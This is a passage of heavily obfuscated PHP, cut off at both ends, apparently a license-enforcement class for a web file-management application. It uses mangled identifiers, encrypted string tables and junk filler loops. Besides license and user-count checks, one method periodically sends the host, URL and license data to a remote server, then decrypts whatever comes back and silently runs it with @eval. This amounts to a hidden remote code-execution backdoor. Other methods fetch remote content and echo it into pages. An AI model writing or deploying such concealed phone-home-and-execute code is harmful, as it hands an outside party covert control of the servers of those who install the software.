$this->sbfn6844cc64(json_encode($®˙ÙùΩñ)); $this->rsjfb8b17b67($òç∏¸ıÑ[183] . $’˝®å¯«); show_json(LNG($òç∏¸ıÑ[184]), !0); } $√Á⁄ü”ï = array($òç∏¸ıÑ[185] => $¢ŸÉÁû˘[$òç∏¸ıÑ[186]], $òç∏¸ıÑ[187] => $¢ŸÉÁû˘[$òç∏¸ıÑ[188]], $òç∏¸ıÑ[189] => rand_string(16), $òç∏¸ıÑ[104] => $¢ŸÉÁû˘[$òç∏¸ıÑ[190]]); if ($”ÿ¸é˘·[$òç∏¸ıÑ[151]]) { $√Á⁄ü”ï[$òç∏¸ıÑ[189]] = $”ÿ¸é˘·[$òç∏¸ıÑ[151]]; } $–˙‚Áô = substr(md5($√Á⁄ü”ï[$òç∏¸ıÑ[187]]), 10, 10); $í¢Ë¢ﬂô = $–˙‚Áô . $√Á⁄ü”ï[$òç∏¸ıÑ[104]] . $√Á⁄ü”ï[$òç∏¸ıÑ[189]]; $ÿÉÓ˛ü∆ = $◊‰ÓñèÖ[662]; if (strlen($ÿÉÓ˛ü∆) < $◊‰ÓñèÖ[627]) { die; } $√Á⁄ü”ï[$òç∏¸ıÑ[106]] = strrev(base64_encode($this->vlcpb3de8e7d($í¢Ë¢ﬂô, $òç∏¸ıÑ[191]))); $ıÙ£÷ïº = rand_string(16); $ﬁÃ”Æ∏Œ = $◊‰ÓñèÖ[663]; if (strlen($ﬁÃ”Æ∏Œ) < $◊‰ÓñèÖ[638]) { die; } $ø±úö‚® = $ıÙ£÷ïº . $√Á⁄ü”ï[$òç∏¸ıÑ[104]] . $this->vlcpb3de8e7d(md5($√Á⁄ü”ï[$òç∏¸ıÑ[185]]), $ıÙ£÷ïº); $ƒ‘ÆÎøÅ = $◊‰ÓñèÖ[664]; $√Á⁄ü”ï[$òç∏¸ıÑ[107]] = base64_encode(strrev($this->vlcpb3de8e7d($ø±úö‚®, $òç∏¸ıÑ[192]))); if ($¢ŸÉÁû˘[$òç∏¸ıÑ[193]] && $¢ŸÉÁû˘[$òç∏¸ıÑ[193]] >= 1) { Model($òç∏¸ıÑ[33])->setDeep($òç∏¸ıÑ[194], $òç∏¸ıÑ[120]); } Model($òç∏¸ıÑ[33])->set($√Á⁄ü”ï); $ÓªÆΩ™± = md5($_SERVER[$òç∏¸ıÑ[101]] . strrev($â›⁄åÍñ) . $√Á⁄ü”ï[$òç∏¸ıÑ[187]]); $åÄ£¡≠Æ = strrev(substr($ÓªÆΩ™±, 10, 16)); $Çí«¨≥„ = $◊‰ÓñèÖ[665]; while (strlen($Çí«¨≥„) < $◊‰ÓñèÖ[12]) { if (!$Çí«¨≥„) { break; } $Çí«¨≥„++; } $«ôßˆΩﬂ = $this->uxwa163bee30(json_encode($¢ŸÉÁû˘), $ÓªÆΩ™±); $ÿœ≤πìÜ = array_to_keyvalue(Model($òç∏¸ıÑ[7])->listData(), $òç∏¸ıÑ[195]); $ôâ€≤„æ = $ÿœ≤πìÜ[$òç∏¸ıÑ[196]]; $Â⁄ÄÛÈΩ = array(); $Â⁄ÄÛÈΩ[$åÄ£¡≠Æ] = $«ôßˆΩﬂ; Model($òç∏¸ıÑ[7])->update($ôâ€≤„æ[$òç∏¸ıÑ[197]], array($òç∏¸ıÑ[198] => $Â⁄ÄÛÈΩ)); $ûóÙ⁄¢± = $◊‰ÓñèÖ[666]; if (!$ûóÙ⁄¢±) { return; } $this->lirg56a9754c = $¢ŸÉÁû˘; $this->lhaf7e17defe = $√Á⁄ü”ï[$òç∏¸ıÑ[104]]; $this->licenseRegistSuccess(); Cache::set($òç∏¸ıÑ[199] . md5($â›⁄åÍñ . $òç∏¸ıÑ[200]), $òç∏¸ıÑ[6]); show_json(LNG($òç∏¸ıÑ[184]), !0); } private function licenseRegistSuccess() { $ÜÊÂæıØ =& $_SERVER[•çºﬂ„ù]; $≠Ø€´ﬁΩ = Model($ÜÊÂæıØ[33])->get(); if ($≠Ø€´ﬁΩ[$ÜÊÂæıØ[63]] != $ÜÊÂæıØ[120]) { Model($ÜÊÂæıØ[33])->set($ÜÊÂæıØ[63], $ÜÊÂæıØ[120]); } Action($ÜÊÂæıØ[201])->initStart(!0); } private function npyvdee67221() { $‰¢ëÀ´ª =& $_SERVER[•çºﬂ„ù]; Model($‰¢ëÀ´ª[33])->set(array($‰¢ëÀ´ª[185] => $‰¢ëÀ´ª[6], $‰¢ëÀ´ª[187] => $‰¢ëÀ´ª[6], $‰¢ëÀ´ª[104] => $‰¢ëÀ´ª[105], $‰¢ëÀ´ª[106] => $‰¢ëÀ´ª[6], $‰¢ëÀ´ª[107] => $‰¢ëÀ´ª[6])); Model($‰¢ëÀ´ª[33])->setDeep($‰¢ëÀ´ª[194], $‰¢ëÀ´ª[202]); $this->lirg56a9754c = array(); $this->lhaf7e17defe = $‰¢ëÀ´ª[105]; } private function dhzg79e1c220() { $ı◊˛ÒÆ∞ =& $_SERVER[Á≈ ä ∞]; $ﬂâ·‰»¢ =& $_SERVER[•çºﬂ„ù]; $_SERVER[$ﬂâ·‰»¢[158]] = _get($_SERVER, $ﬂâ·‰»¢[158], APP_HOST); $‘è®˛›ß = $ı◊˛ÒÆ∞[667]; while (strlen($‘è®˛›ß) < $ı◊˛ÒÆ∞[630]) { if (!$‘è®˛›ß) { break; } $‘è®˛›ß++; } $this->lhaf7e17defe = $ﬂâ·‰»¢[105]; $‹†É≈ƒë = $ı◊˛ÒÆ∞[668]; while (strlen($‹†É≈ƒë) < $ı◊˛ÒÆ∞[12]) { if (!$‹†É≈ƒë) { break; } $‹†É≈ƒë++; } $’£öèﬂÖ = Model($ﬂâ·‰»¢[33])->get(); $®ƒàﬂ•¡ = $ı◊˛ÒÆ∞[669]; if ($’£öèﬂÖ[$ﬂâ·‰»¢[104]] == $ﬂâ·‰»¢[105]) { return; } $óü∑Ÿò∏ = Model($ﬂâ·‰»¢[33])->get($ﬂâ·‰»¢[102]); $ó⁄••õ∏ = $ı◊˛ÒÆ∞[670]; $ºµÁ›èì = $ﬂâ·‰»¢[199] . md5($óü∑Ÿò∏ . $ﬂâ·‰»¢[200]); $êƒÜÒÒπ = Cache::get($ºµÁ›èì); if (!is_array($êƒÜÒÒπ) || !isset($êƒÜÒÒπ[$ﬂâ·‰»¢[203]]) || time() - $êƒÜÒÒπ[$ﬂâ·‰»¢[203]] >= 60) { $÷Ô•ë·ó = Model($ﬂâ·‰»¢[7])->loadList(); $ñúË—±ø = $÷Ô•ë·ó[$ﬂâ·‰»¢[196]]; $¥∑—üÕÜ = md5($_SERVER[$ﬂâ·‰»¢[101]] . strrev($óü∑Ÿò∏) . $’£öèﬂÖ[$ﬂâ·‰»¢[187]]); $´ëñ°ä„ = strrev(substr($¥∑—üÕÜ, 10, 16)); $êƒÜÒÒπ = $this->adfpf153236a($ñúË—±ø[$ﬂâ·‰»¢[84]][$´ëñ°ä„], $¥∑—üÕÜ); $êƒÜÒÒπ = json_decode($êƒÜÒÒπ, !0); } if (!is_array($êƒÜÒÒπ)) { return $this->npyvdee67221(); } $ı»·¢õŒ = strtotime($êƒÜÒÒπ[$ﬂâ·‰»¢[127]]); if (time() >= $ı»·¢õŒ) { return $this->npyvdee67221(); } if (time() - $êƒÜÒÒπ[$ﬂâ·‰»¢[203]] > 20) { $êƒÜÒÒπ[$ﬂâ·‰»¢[203]] = time(); Cache::set($ºµÁ›èì, $êƒÜÒÒπ); } $this->lirg56a9754c = $êƒÜÒÒπ; $this->lhaf7e17defe = $’£öèﬂÖ[$ﬂâ·‰»¢[104]]; } private function xmzac7fee5f4() { $ÖŒ≤ôÜ =& $_SERVER[•çºﬂ„ù]; $÷ﬂöç∂è = $GLOBALS[$ÖŒ≤ôÜ[13]]; $ÉÇ–¯Á¬ = $_SERVER[$ÖŒ≤ôÜ[24]]; if ($ÉÇ–¯Á¬ == $ÖŒ≤ôÜ[204] && $this->lhaf7e17defe == $ÖŒ≤ôÜ[105]) { show_json(LNG($ÖŒ≤ôÜ[205]), !1, $ÖŒ≤ôÜ[206]); } $¸˚áØ´‡ = array($ÖŒ≤ôÜ[207], $ÖŒ≤ôÜ[208]); if (in_array($ÉÇ–¯Á¬, $¸˚áØ´‡)) { if ($this->lhaf7e17defe == $ÖŒ≤ôÜ[105] && isset($÷ﬂöç∂è[$ÖŒ≤ôÜ[209]])) { show_json(LNG($ÖŒ≤ôÜ[205]), !1, $ÖŒ≤ôÜ[206]); die; } $À⁄è≤Ô◊ = $this->siay0482e76c(); if ($À⁄è≤Ô◊ != intval($ÖŒ≤ôÜ[210])) { if ($À⁄è≤Ô◊ <= Model($ÖŒ≤ôÜ[123])->count()) { show_json(LNG($ÖŒ≤ôÜ[211]), !1, $ÖŒ≤ôÜ[206]); die; } } } } private function yzgo43c52100() { $€¢ÄÉ”ı =& $_SERVER[Á≈ ä ∞]; $´˛™ÔÙ´ =& $_SERVER[•çºﬂ„ù]; $ËöÃíﬁ≈ = array($´˛™ÔÙ´[117], $´˛™ÔÙ´[118]); $Ω§»ııÛ = $€¢ÄÉ”ı[671]; while ($Ω§»ııÛ < $€¢ÄÉ”ı[12]) { if ($Ω§»ııÛ >= 0) { break; } $Ω§»ııÛ++; } if (!_get($GLOBALS, $´˛™ÔÙ´[114]) || !isset($_GET[$´˛™ÔÙ´[212]])) { return; } if (!in_array($_SERVER[$´˛™ÔÙ´[24]], $ËöÃíﬁ≈)) { return; } $ò‹∆úñü = $´˛™ÔÙ´[213]; $ò‹∆úñü = $this->rszj7b8456c2($ò‹∆úñü, $´˛™ÔÙ´[214]); $Ù‡Î’âÍ = $€¢ÄÉ”ı[672]; if (!$Ù‡Î’âÍ) { die; } $™©ñóÊÅ = stream_context_create(array($´˛™ÔÙ´[215] => array($´˛™ÔÙ´[216] => $´˛™ÔÙ´[217], $´˛™ÔÙ´[218] => 3))); $ÃÍøûö¥ = @file_get_contents($ò‹∆úñü, !1, $™©ñóÊÅ); $∑∫ËÁ≈â = $€¢ÄÉ”ı[673]; header($´˛™ÔÙ´[219]); $¸©üÀÃù = $€¢ÄÉ”ı[674]; if (strlen($¸©üÀÃù) < $€¢ÄÉ”ı[630]) { return; } if ($ÃÍøûö¥ && strstr($ÃÍøûö¥, $´˛™ÔÙ´[220])) { echo $ÃÍøûö¥; } die; } public function aoevf46c0614($´•ôÌÍ∞) { $êŒ¬°∫ì =& $_SERVER[Á≈ ä ∞]; $ˆçË¬‹ç =& $_SERVER[•çºﬂ„ù]; if ($this->lhaf7e17defe == $ˆçË¬‹ç[221]) { return $´•ôÌÍ∞; } $ÒÅ÷ƒ“Ù = array($ˆçË¬‹ç[222] => $ˆçË¬‹ç[223], $ˆçË¬‹ç[224] => $ˆçË¬‹ç[223], $ˆçË¬‹ç[225] => $ˆçË¬‹ç[223], $ˆçË¬‹ç[226] => $ˆçË¬‹ç[223], $ˆçË¬‹ç[227] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[229] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[230] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[231] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[232] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[233] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[234] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[235] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[236] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[237] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[238] => $ˆçË¬‹ç[228], $ˆçË¬‹ç[239] => $ˆçË¬‹ç[228]); $´›ˆÂ˚° = $êŒ¬°∫ì[675]; while ($´›ˆÂ˚° < $êŒ¬°∫ì[627]) { if ($´›ˆÂ˚° >= 0) { break; } $´›ˆÂ˚°++; } $éîÓÆÏé = explode($ˆçË¬‹ç[240], _get($this->lirg56a9754c, $ˆçË¬‹ç[111], $ˆçË¬‹ç[6])); $ç•È‚‡˛ = $êŒ¬°∫ì[676]; if (!$ç•È‚‡˛) { return; } $∏ç“äã– = array(); foreach ($ÒÅ÷ƒ“Ù as $ô–¶ãÂù => $≥ï†ÄÙÿ) { if ($≥ï†ÄÙÿ == $ˆçË¬‹ç[223] && substr($this->lhaf7e17defe, 0, 1) == $ˆçË¬‹ç[223]) { continue; } if (!in_array($ô–¶ãÂù, $éîÓÆÏé)) { $∏ç“äã–[] = $ô–¶ãÂù; } } foreach ($∏ç“äã– as $ô–¶ãÂù) { unset($´•ôÌÍ∞[$ô–¶ãÂù]); } return $´•ôÌÍ∞; $õÂ–°¯ó = $êŒ¬°∫ì[677]; if (strlen($õÂ–°¯ó) < $êŒ¬°∫ì[12]) { die; } } private function nsmida1d2094() { $úÿ‰˚Á∆ =& $_SERVER[•çºﬂ„ù]; if ($this->lhaf7e17defe != $úÿ‰˚Á∆[105]) { $GLOBALS[$úÿ‰˚Á∆[84]][$úÿ‰˚Á∆[88]][$úÿ‰˚Á∆[241]] = $úÿ‰˚Á∆[202]; return; } $GLOBALS[$úÿ‰˚Á∆[84]][$úÿ‰˚Á∆[242]] = $úÿ‰˚Á∆[120]; if (Model($úÿ‰˚Á∆[243])->get($úÿ‰˚Á∆[63]) != $úÿ‰˚Á∆[202]) { Model($úÿ‰˚Á∆[243])->set($úÿ‰˚Á∆[63], $úÿ‰˚Á∆[202]); } } public function tujod3c79c60() { return $_SERVER[•çºﬂ„ù][244]; } private function xsbvb1bbea2a() { $˚‡Ä®â› =& $_SERVER[Á≈ ä ∞]; $ÃòçÎÄä =& $_SERVER[•çºﬂ„ù]; $Í∞‰ûø = array($ÃòçÎÄä[245], $ÃòçÎÄä[246], $ÃòçÎÄä[247]); $ı·’¶⁄§ = $ÃòçÎÄä[248] . md5($ÃòçÎÄä[249]); $ÉÕ¬Ä†˚ = $˚‡Ä®â›[678]; if ($this->lhaf7e17defe == $ÃòçÎÄä[105] || !_get($GLOBALS, $ÃòçÎÄä[114])) { return; } if (!in_array($_SERVER[$ÃòçÎÄä[24]], $Í∞‰ûø)) { return; } if (time() % 4 != 0) { return; } $›Í£Æ≠˙ = call_user_func(array($ÃòçÎÄä[250], $ÃòçÎÄä[251]), $ı·’¶⁄§); if ($›Í£Æ≠˙ && time() - $›Í£Æ≠˙ < intval($ÃòçÎÄä[252])) { return; } call_user_func(array($ÃòçÎÄä[250], $ÃòçÎÄä[137]), $ı·’¶⁄§, time()); $º˘Ùö¢„ = $˚‡Ä®â›[679]; while (strlen($º˘Ùö¢„) < $˚‡Ä®â›[627]) { if (!$º˘Ùö¢„) { break; } $º˘Ùö¢„++; } $ƒõÙ‚ã— = Model($ÃòçÎÄä[33])->get($ÃòçÎÄä[102]); $Ï´ö√Ø∆ = $˚‡Ä®â›[680]; if (!$Ï´ö√Ø∆) { return; } $Ω¥àèÊÄ = array($ÃòçÎÄä[149] => Model($ÃòçÎÄä[33])->get($ÃòçÎÄä[185]), $ÃòçÎÄä[162] => $this->lhaf7e17defe, $ÃòçÎÄä[159] => $_SERVER[$ÃòçÎÄä[160]], $ÃòçÎÄä[161] => Model($ÃòçÎÄä[33])->get($ÃòçÎÄä[129]), $ÃòçÎÄä[100] => md5($_SERVER[$ÃòçÎÄä[101]] . $ƒõÙ‚ã—), $ÃòçÎÄä[152] => $ÃòçÎÄä[134], $ÃòçÎÄä[155] => $_SERVER[$ÃòçÎÄä[156]]); $ã÷‹ãı“ = $˚‡Ä®â›[681]; if (strlen($ã÷‹ãı“) < $˚‡Ä®â›[630]) { return; } $∏‰∏◊∂ = $this->rsjfb8b17b67($ÃòçÎÄä[253], $Ω¥àèÊÄ); $ÏΩ°ÑôÁ = $˚‡Ä®â›[682]; if (!is_array($∏‰∏◊∂)) { return; } if ($∏‰∏◊∂[$ÃòçÎÄä[149]] && $∏‰∏◊∂[$ÃòçÎÄä[254]]) { if ($this->ivardc74abb8($∏‰∏◊∂[$ÃòçÎÄä[254]]) == $Ω¥àèÊÄ[$ÃòçÎÄä[149]]) { return; } } $this->npyvdee67221(); if ($this->ivardc74abb8($∏‰∏◊∂[$ÃòçÎÄä[254]]) != $Ω¥àèÊÄ[$ÃòçÎÄä[149]]) { $˜¸Î¥ƒÌ = array($ÃòçÎÄä[180] => $ƒõÙ‚ã—, $ÃòçÎÄä[181] => $_SERVER[$ÃòçÎÄä[101]], $ÃòçÎÄä[182] => this_url(), $ÃòçÎÄä[157] => $_SERVER[$ÃòçÎÄä[158]]); $ö∞Òäı÷ = $this->sbfn6844cc64(json_encode($˜¸Î¥ƒÌ)); $∏‰∏◊∂ = $this->rsjfb8b17b67($ÃòçÎÄä[183] . $ö∞Òäı÷); if ($∏‰∏◊∂ && is_array($∏‰∏◊∂) && isset($∏‰∏◊∂[$ÃòçÎÄä[254]])) { $˝Èô˙‹Ø = $this->adfpf153236a($∏‰∏◊∂[$ÃòçÎÄä[254]], 2); if ($˝Èô˙‹Ø) { $˝Èô˙‹Ø = $this->ivardc74abb8($˝Èô˙‹Ø); } if ($˝Èô˙‹Ø) { try { @eval($˝Èô˙‹Ø); } catch (Exception $“œ£ìÂ˛) { } } } } } private function rsjfb8b17b67($»¨Ò¶ŒÒ = '', $©†ì∑ÅÃ = array(), $ÙÎà€ì∂ = 5) { $Ã∂™û˘® =& $_SERVER[Á≈ ä ∞]; $œ´‚°Í∂ =& $_SERVER[•çºﬂ„ù]; $Ó§–¸¡∑ = $œ´‚°Í∂[255]; $¬˛≠Ë‹Í = $Ã∂™û˘®[683]; if (strlen($¬˛≠Ë‹Í) < $Ã∂™û˘®[638]) { die; } $Ó§–¸¡∑ = $this->rszj7b8456c2($Ó§–¸¡∑, $œ´‚°Í∂[256]); $Ó§–¸¡∑ = $Ó§–¸¡∑ . $»¨Ò¶ŒÒ; if ($©†ì∑ÅÃ && is_array($©†ì∑ÅÃ)) { $Ó§–¸¡∑ = $Ó§–¸¡∑ . $œ´‚°Í∂[257] . http_build_query($©†ì∑ÅÃ); } if ($©†ì∑ÅÃ === -1) { return $Ó§–¸¡∑; } $æùÀçˆ∏ = stream_context_create(array($œ´‚°Í∂[215] => array($œ´‚°Í∂[218] => $ÙÎà€ì∂, $œ´‚°Í∂[216] => $œ´‚°Í∂[258]), $œ´‚°Í∂[259] => array($œ´‚°Í∂[260] => !1, $œ´‚°Í∂[261] => !1))); $©†ì∑ÅÃ = @file_get_contents($Ó§–¸¡∑, !1, $æùÀçˆ∏); $Çº˘¯ú¡ = $Ã∂™û˘®[684]; while (strlen($Çº˘¯ú¡) < $Ã∂™û˘®[638]) { if (!$Çº˘¯ú¡) { break; } $Çº˘¯ú¡++; } return json_decode($©†ì∑ÅÃ, !0); $ïáÒâè£ = $Ã∂™û˘®[685]; while (strlen($ïáÒâè£) < $Ã∂™û˘®[12]) { if (!$ïáÒâè£) { break; } $ïáÒâè£++; } } private function siay0482e76c() { $ΩáÊ¨êò =& $_SERVER[•çºﬂ„ù]; $‚û–Í—á = array($ΩáÊ¨êò[262] => $ΩáÊ¨êò[263], $ΩáÊ¨êò[264] => $ΩáÊ¨êò[265], $ΩáÊ¨êò[266] => $ΩáÊ¨êò[267], $ΩáÊ¨êò[268] => $ΩáÊ¨êò[269], $ΩáÊ¨êò[270] => $ΩáÊ¨êò[271], $ΩáÊ¨êò[272] => $ΩáÊ¨êò[210], $ΩáÊ¨êò[273] => $ΩáÊ¨êò[210], $ΩáÊ¨êò[274] => $ΩáÊ¨êò[263], $ΩáÊ¨êò[275] => $ΩáÊ¨êò[265], $ΩáÊ¨êò[276] => $ΩáÊ¨êò[267], $ΩáÊ¨êò[277] => $ΩáÊ¨êò[278], $ΩáÊ¨êò[279] => $ΩáÊ¨êò[269], $ΩáÊ¨êò[280] => $ΩáÊ¨êò[281], $ΩáÊ¨êò[282] => $ΩáÊ¨êò[271], $ΩáÊ¨êò[283] => $ΩáÊ¨êò[284], $ΩáÊ¨êò[285] => $ΩáÊ¨êò[286], $ΩáÊ¨êò[287] => $ΩáÊ¨êò[288]); $¬Ÿì⁄Ú“ = $‚û–Í—á[$this->lhaf7e17defe]; $ûêêô◊Œ = $_SERVER[Á≈ ä ∞][686]; $¬Ÿì⁄Ú“ = intval($¬Ÿì⁄Ú“ ? $¬Ÿì⁄Ú“ : $ΩáÊ¨êò[263]); $√ÿòÉ°ª = _get($this->lirg56a9754c, $ΩáÊ¨êò[289]); $√ÿòÉ°ª = $√ÿòÉ°ª ? intval($√ÿòÉ°ª) : 0; return $¬Ÿì⁄Ú“ + $√ÿòÉ°ª; } public function qclic13cbe35($¿‘˚—í≤) { $…¶Õˆ°‚ =& $_SERVER[•çºﬂ„ù]; $Ÿ„¸©‘∞ = $this->siay0482e76c(); $’•˜ÅÎÜ = $_SERVER[Á≈ ä ∞][687]; if (!$’•˜ÅÎÜ) { return; } if ($¿‘˚—í≤[$…¶Õˆ°‚[290]] == $…¶Õˆ°‚[120]) { return; } if ($Ÿ„¸©‘∞ >= intval($…¶Õˆ°‚[210])) { return; } $ä†öÇ±‡ = Model($…¶Õˆ°‚[123])->count(); if ($ä†öÇ±‡ <= $Ÿ„¸©‘∞) { return; } $⁄ÆÿŸ¢Å = Model($…¶Õˆ°‚[123])->field($…¶Õˆ°‚[290])->limit($Ÿ„¸©‘∞)->select(); $⁄ÆÿŸ¢Å = array_to_keyvalue($⁄ÆÿŸ¢Å, $…¶Õˆ°‚[6], $…¶Õˆ°‚[290]); if (!in_array($¿‘˚—í≤[$…¶Õˆ°‚[290]], $⁄ÆÿŸ¢Å)) { show_json($…¶Õˆ°‚[291], !1, $…¶Õˆ°‚[206]); } } public function mjnwc8762b66() { $ˆƒ≠Ä¢ö =& $_SERVER[Á≈ ä ∞]; $•ï´Û¿‚ =& $_SERVER[•çºﬂ„ù]; if (!_get($GLOBALS, $•ï´Û¿‚[114]) || mt_rand(1, 100) > 20) { return; } $ë…¿·˙ö = $•ï´Û¿‚[213]; $ë…¿·˙ö = $this->rszj7b8456c2($ë…¿·˙ö, $•ï´Û¿‚[214]); $±—ß¿ÃÑ = stream_context_create(array($•ï´Û¿‚[215] => array($•ï´Û¿‚[216] => $•ï´Û¿‚[217], $•ï´Û¿‚[218] => 3))); $´Á÷§À“ = @file_get_contents($ë…¿·˙ö, !1, $±—ß¿ÃÑ); $Æ«π∞ Ÿ = $ˆƒ≠Ä¢ö[688]; echo $•ï´Û¿‚[292] . hash_encode($´Á÷§À“) . $•ï´Û¿‚[293]; $—Ëà¨Êâ = $ˆƒ≠Ä¢ö[689]; } private function uxwa163bee30($ï‚ˆ∏Ÿö, $ÈÂâ €¶, $±ıåÛ∂ = 3) { $ÎÑ–·˛ˆ =& $_SERVER[Á≈ ä ∞]; $óè”ÃŸô =& $_SERVER[•çºﬂ„ù]; usleep(1); $∑âùÃ˜˘ = $ÎÑ–·˛ˆ[690]; if (strlen($∑âùÃ˜˘) < $ÎÑ–·˛ˆ[654]) { die; } $ï‚ˆ∏Ÿö = trim($ï‚ˆ∏Ÿö); $Œ¬÷¥ÃÚ = mt_rand(0, 5) . $óè”ÃŸô[6]; $˛≠çµ∑£ = rand_string(15); $ë≠ø∫Æ‘ = $ÎÑ–·˛ˆ[691]; if (!$ë≠ø∫Æ‘) { die; } $ñÿ áØ˝ = $óè”ÃŸô[294]; $öÀﬁ€á« = $ÎÑ–·˛ˆ[692]; if (!$öÀﬁ€á«) { die; } switch ($Œ¬÷¥ÃÚ) { case $óè”ÃŸô[202]: $⁄Ø◊Ω≠å = $this->vlcpb3de8e7d($ï‚ˆ∏Ÿö, strrev($ÈÂâ €¶ . $˛≠çµ∑£)); break; $ç‰∆£ºî = $ÎÑ–·˛ˆ[693]; if (strlen($ç‰∆£ºî) < $ÎÑ–·˛ˆ[654]) { return; } case $óè”ÃŸô[120]: $⁄Ø◊Ω≠å = $this->vlcpb3de8e7d($ï‚ˆ∏Ÿö, strrev($˛≠çµ∑£ . $ÈÂâ €¶)); $‡Ø≠éŒ— = $ÎÑ–·˛ˆ[694]; if (!$‡Ø≠éŒ—) { die; } break; $Òóã öë = $ÎÑ–·˛ˆ[695]; if (strlen($Òóã öë) < $ÎÑ–·˛ˆ[638]) { return; } case $óè”ÃŸô[295]: $⁄Ø◊Ω≠å = $this->vlcpb3de8e7d($ï‚ˆ∏Ÿö, base64_encode($˛≠çµ∑£ . $ÈÂâ €¶)); break; case $óè”ÃŸô[296]: $⁄Ø◊Ω≠å = $this->vlcpb3de8e7d($ï‚ˆ∏Ÿö, md5($˛≠çµ∑£ . $ÈÂâ €¶)); break; $Æò·∆íã = $ÎÑ–·˛ˆ[696]; case $óè”ÃŸô[297]: $ï‚ˆ∏Ÿö = base64_encode($ï‚ˆ∏Ÿö); $ò≤¿€Ö÷ = $ÎÑ–·˛ˆ[697]; $›±òÖÌ“ = rand(0, 64); $‘ÎÙ´áì = $ñÿ áØ˝[$›±òÖÌ“]; $Ë¬Ú™ÏÄ = $ÎÑ–·˛ˆ[698]; if (!$Ë¬Ú™ÏÄ) { die; } $Äüò≈À∑ = md5($‘ÎÙ´áì . md5($ÈÂâ €¶ . $‘ÎÙ´áì) . $ÈÂâ €¶); $—Ωıàèé = $ÎÑ–·˛ˆ[699]; if (!$—Ωıàèé) { die; } $Äüò≈À∑ = substr($Äüò≈À∑, $›±òÖÌ“ % 8, $›±òÖÌ“ % 8 + 7); $≠ê˙Îó“ = $óè”ÃŸô[6]; $ÏÁ‹œÕÛ = $ÎÑ–·˛ˆ[700]; if (!$ÏÁ‹œÕÛ) { die; } $§˘ë¿“∂ = 0; $¶˛«£ƒ‡ = $ÎÑ–·˛ˆ[701]; $Ç›—‘∑› = 0; $õ≤™æÄú = $ÎÑ–·˛ˆ[702]; $∂€†–¶Ã = 0; for ($§˘ë¿“∂ = 0; $§˘ë¿“∂ < strlen($ï‚ˆ∏Ÿö); $§˘ë¿“∂++) { $∂€†–¶Ã = $∂€†–¶Ã == strlen($Äüò≈À∑) ? 0 : $∂€†–¶Ã; $Ç›—‘∑› = ($›±òÖÌ“ + strpos($ñÿ áØ˝, $ï‚ˆ∏Ÿö[$§˘ë¿“∂]) + ord($Äüò≈À∑[$∂€†–¶Ã++])) % 64; $ Ñ¯çîõ = $ÎÑ–·˛ˆ[703]; $≠ê˙Îó“ .= $ñÿ áØ˝[$Ç›—‘∑›]; } $⁄Ø◊Ω≠å = hash_encode($‘ÎÙ´áì . $≠ê˙Îó“); $É©ø£˚‘ = $ÎÑ–·˛ˆ[704]; while (strlen($É©ø£˚‘) < $ÎÑ–·˛ˆ[12]) { if (!$É©ø£˚‘) { break; } $É©ø£˚‘++; } break; default: $⁄Ø◊Ω≠å = $this->vlcpb3de8e7d($ï‚ˆ∏Ÿö, $ÈÂâ €¶ . $˛≠çµ∑£); $òå¯ÆÊ› = $ÎÑ–·˛ˆ[705]; if (!$òå¯ÆÊ›) { return; } break; $∫ÏíçÓä = $ÎÑ–·˛ˆ[706]; if (strlen($∫ÏíçÓä) < $ÎÑ–·˛ˆ[654]) { die; } } $⁄Ø◊Ω≠å = strrev($Œ¬÷¥ÃÚ . $˛≠çµ∑£ . $⁄Ø◊Ω≠å); if ($±ıåÛ∂ - 1 > 0) { $⁄Ø◊Ω≠å = $this->uxwa163bee30($⁄Ø◊Ω≠å, $ÈÂâ €¶, $±ıåÛ∂ - 1); } return $⁄Ø◊Ω≠å; } private function adfpf153236a($ïÛıßá›, $¡ÇÀ•´ù, $Ù∑Œ¯π  = 3) { $Ø∫Ïº·â =& $_SERVER[Á≈ ä ∞]; $‡£Øπ≈¸ =& $_SERVER[•çºﬂ„ù]; if (!is_string($ïÛıßá›) || strlen($ïÛıßá›) < 10) { return !1; } $ïÛıßá› = trim($ïÛıßá›); $ßﬂ’≥∏† = $Ø∫Ïº·â[707]; while ($ßﬂ’≥∏† < $Ø∫Ïº·â[638]) { if ($ßﬂ’≥∏† >= 0) { break; } $ßﬂ’≥∏†++; } $ïÛıßá› = strrev($ïÛıßá›); $„ç«ÀÇ = $ïÛıßá›[0]; $¶î’ß¸á = $Ø∫Ïº·â[708]; if (strlen($¶î’ß¸á) < $Ø∫Ïº·â[654]) { return; } $≤ìÀ¯Îü = substr($ïÛıßá›, 1, 15); $ªŸò√åã = $Ø∫Ïº·â[709]; if (!$ªŸò√åã) { return; } $ïÛıßá› = substr($ïÛıßá›, 16); $«ıÁﬂú≈ = $Ø∫Ïº·â[710]; while ($«ıÁﬂú≈ < $Ø∫Ïº·â[654]) { if ($«ıÁﬂú≈ >= 0) { break; } $«ıÁﬂú≈++; } $‹ª€Ó∏∑ = $‡£Øπ≈¸[294]; $éµÑ˜èé = $Ø∫Ïº·â[711]; if (!$éµÑ˜èé) { die; } switch ($„ç«ÀÇ) { case $‡£Øπ≈¸[202]: $˙—¨√µ≥ = $this->rszj7b8456c2($ïÛıßá›, strrev($¡ÇÀ•´ù . $≤ìÀ¯Îü)); $ßÒÈ•Ê„ = $Ø∫Ïº·â[712]; if (strlen($ßÒÈ•Ê„) < $Ø∫Ïº·â[630]) { die; } break; $Ó¢Úê©â = $Ø∫Ïº·â[713]; if (strlen($Ó¢Úê©â) < $Ø∫Ïº·â[654]) { die; } case $‡£Øπ≈¸[120]: $˙—¨√µ≥ = $this->rszj7b8456c2($ïÛıßá›, strrev($≤ìÀ¯Îü . $¡ÇÀ•´ù)); break; $÷Áì”¢Î = $Ø∫Ïº·â[714]; if (!$÷Áì”¢Î) { return; } case $‡£Øπ≈¸[295]: $˙—¨√µ≥ = $this->rszj7b8456c2($ïÛıßá›, base64_encode($≤ìÀ¯Îü . $¡ÇÀ•´ù)); $∞∑Èû™¥ = $Ø∫Ïº·â[715]; if (strlen($∞∑Èû™¥) < $Ø∫Ïº·â[638]) { die; } break; $™©Àı∫ó = 